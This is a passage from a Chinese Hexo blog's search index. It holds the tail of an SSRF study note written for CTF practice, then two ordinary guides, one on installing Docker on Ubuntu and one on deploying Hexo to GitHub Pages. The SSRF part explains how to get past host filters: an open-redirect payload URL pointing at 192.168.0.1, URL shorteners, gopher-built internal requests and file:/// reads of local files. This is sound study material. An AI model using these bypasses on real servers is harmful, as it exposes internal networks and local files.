利用跳转</h3><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p><p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p><p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p><h3 id="4-4-通过各种非HTTP协议"><a href="#4-4-通过各种非HTTP协议" class="headerlink" title="4.4 通过各种非HTTP协议"></a>4.4 通过各种非HTTP协议</h3><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</p><p>除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 <code>file:///path/to/file</code> 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。</p><hr><p>21校赛web1:</p><img src="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/image-20220113170310978.png" alt="web1" style="zoom:25%;"><img src="/2022/01/11/%E5%85%B3%E4%BA%8ESSRF/image-20220113170433765.png" alt="web1-wp" style="zoom:25%;"><hr><p>参考链接：</p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html#section-6">4.4. SSRF — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)</a></p><p><a href="http://jxz1.j9p.com/pc/gdfgfhgjhgf.pdf">CTF特训营 (网络空间安全技术丛书) (j9p.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu Docker 安装</title>
      <link href="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/"/>
      <url>/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>1、更新ubuntu的apt源索引</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br></pre></td></tr></table></figure><p><strong>2、如果已安装过docker先删除</strong>（没有直接跳过）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get remove docker docker-engine docker.io containerd runc</span></span><br></pre></td></tr></table></figure><p>旧版名称是docker , 最新社区版 docker-engine， 目前已改名为docker-ce</p><p><strong>3、安装包允许apt通过HTTPS使用仓库</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --configure -a</span><br><span class="line">sudo apt-get install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p><strong>4、添加Docker官方GPG key</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p><strong>5、设置Docker稳定版仓库</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span></span><br></pre></td></tr></table></figure><p>添加仓库后，更新apt源索引</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br></pre></td></tr></table></figure><p>前面的准备工作完成以后，接下来安装最新版Docker CE（社区版）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install docker-ce</span></span><br></pre></td></tr></table></figure><p>检查Docker CE是否安装正确</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker run hello-world</span></span><br></pre></td></tr></table></figure><p>出现了<code>hello from Docker</code>则表示上面的安装成功！</p><p><strong>6、docker的基本命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动docker</span></span><br><span class="line">sudo service docker start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止docker</span></span><br><span class="line">sudo service docker stop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启docker</span></span><br><span class="line">sudo service docker restart</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出镜像</span></span><br><span class="line">docker image ls</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 拉取镜像</span></span><br><span class="line">docker image pull library/hello-world</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除镜像</span></span><br><span class="line">docker image rm 镜像id/镜像ID</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建容器</span></span><br><span class="line">docker run [选项参数] 镜像名 [命令]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止一个已经在运行的容器</span></span><br><span class="line">docker container stop 容器名或容器id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动一个已经停止的容器</span></span><br><span class="line">docker container start 容器名或容器id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>掉一个已经在运行的容器</span></span><br><span class="line">docker container kill 容器名或容器id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器</span></span><br><span class="line">docker container rm 容器名或容器id</span><br></pre></td></tr></table></figure><p><strong>校赛复现示例</strong>：</p><p>在第五步完成后操作如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220110231817050.png" alt="image-20220110231817050" style="zoom:33%;"><p>打开其中的web在虚拟机里创建一个文件夹，把这些文件放进去。<img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220110232241002.png" alt="image-20220110232241002" style="zoom:33%;"></p><p>打开yml文件，把容器名字改一下，把80：80改成10001：80</p><p>在这个页面打开终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">docker ps</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220111223510229.png" alt="image-20220111223510229" style="zoom:25%;"><p>之后访问：</p><p>类似<img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220111141906536.png" alt="image-20220111141906536" style="zoom:33%;">这个地址+ <code>：10001（根据题目更改）</code></p><p>: )</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用hexo+github搭建博客</title>
      <link href="/2022/01/06/%E5%88%A9%E7%94%A8hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022/01/06/%E5%88%A9%E7%94%A8hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>1.安装Node.js</strong> </p><p>安装选项全部默认，一路点击<code>Next</code>。</p><p>最后安装好之后，按<code>Win+R</code>打开命令提示符，</p><p>输入<code>node -v</code>和<code>npm -v</code>，如果出现版本号，那么就安装成功了。</p><p><strong>2.安装Git</strong></p><p>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具————Git</p><p>安装选项还是全部默认，只不过最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>，这样我们就可以直接在命令提示符里打开git了。</p><p>安装完成后在命令提示符中输入<code>git --version</code>验证是否安装成功。</p><p><strong>3.安装hexo</strong></p><p>在合适的地方新建一个文件夹，用来存放自己的博客文件。</p><p>在该目录下右键点击<code>Git Bash Here</code>，打开git的控制台窗口，以后我们所有的操作都在git控制台进行，就不要用Windows自带的控制台了。</p><p>定位到该目录下，输入<code>npm i hexo-cli -g</code>安装Hexo。会有几个报错，无视它就行。</p><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>然后就要初始化我们的网站，输入<code>hexo init</code>初始化文件夹，接着输入<code>npm install</code>安装必备的组件。</p><p>这样本地的网站配置也弄好啦，输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器，然后浏览器打开<a href="https://link.zhihu.com/?target=http://localhost:4000/">http://localhost:4000/</a>。出现Hexo默认页面，安装完成。</p><p><strong>4.连接Github与本地</strong></p><p>首先右键打开git bash，然后输入下面命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>然后生成密钥SSH key：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>打开<a href="https://link.zhihu.com/?target=http://github.com/">github</a>，在头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个SSH，名字随便。</p><p>git bash中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>将输出的内容复制到框中，点击确定保存。</p><p>输入<code>ssh -T git@github.com</code></p><p>首先安装 hexo-deployer-git：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后修改*_config.yml* 文件末尾的 Deployment 部分，修改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>完成后运行 <code>hexo d</code> 将网站上传部署到 GitHub Pages。</p><p>完成！这时访问我们的 GitHub 域名 <code>https://用户名.github.io</code> 就可以看到 Hexo 网站了。</p><p>[参考知乎教程1](<a href="https://zhuanlan.zhihu.com/p/35668237">超详细Hexo+Github博客搭建小白教程 - 知乎 (zhihu.com)</a>)</p><p>[参考知乎教程2](<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎 (zhihu.com)</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
